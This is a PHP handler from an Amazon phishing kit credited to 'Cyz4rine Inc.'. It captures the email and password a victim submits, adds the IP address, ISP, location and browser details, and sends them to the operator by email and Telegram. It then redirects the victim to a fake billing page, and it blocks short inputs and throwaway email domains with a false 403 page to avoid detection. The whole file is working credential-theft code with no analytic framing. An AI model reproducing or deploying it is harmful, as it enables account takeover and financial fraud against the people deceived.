<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once("../blocker3.php");
require_once('../session.php');

$ip = getUserIP();
if(strlen($_POST['emailLogin']) < 6) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if(strlen($_POST['passwordLogin']) < 3) {
  tulis_file("../security/onetime.dat","$ip");
header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['emailLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
  header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['passwordLogin'] == "") {
  tulis_file("../security/onetime.dat","$ip");
  header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
 if(preg_match("/mailinator|yatdew.com|mteen.net|tf-info.com|theaccessuk.org|fuds.net|fuck/", $_POST['emailLogin'])){
  tulis_file("../security/onetime.dat","$ip");
             header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ispuser = getisp($ip);
$message  = "--------------------[ AMAZON LOGIN ]-------------------------\n";
$message .= "User ID    : ".$_POST['emailLogin']."\n";
$message .= "Password   : ".$_POST['passwordLogin']."\n";
$message .= "--------------------------[ PC INFORMATION ]-------------------------\n";
$message .= "IP Address   : ".$ip."\n";
$message .= "ISP        : ".$ispuser."\n";
$message .= "Region       : ".$regioncity."\n";
$message .= "City       : ".$citykota."\n";
$message .= "Continent    : ".$continent."\n";
$message .= "Timezone   : ".$timezone."\n";
$message .= "OS/Browser   : ".$os." / ".$br."\n";
$message .= "Date     : ".$date."\n";
$message .= "User Agent   : ".$user_agent."\n";
$message .= "--------------------------[ Cyz4rine Inc. ]-----------------------------\n";

$_SESSION['email'] = $_POST['emailLogin'];
$_SESSION['password'] = $_POST['passwordLogin'];
if($config['send_login'] == 'on') {
  $to = $result;
  $from = 'Amazon Login';
$subject = "AMAZON LOGIN: ".$_POST['emailLogin']." [ $cn - $os - $ip ]";
  kirim_mail($to,$from,$subject,$message,$headers);
  tele_res($message);
}
  tulis_file("../result/total_login.txt", $ip);
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
    exit();
?>
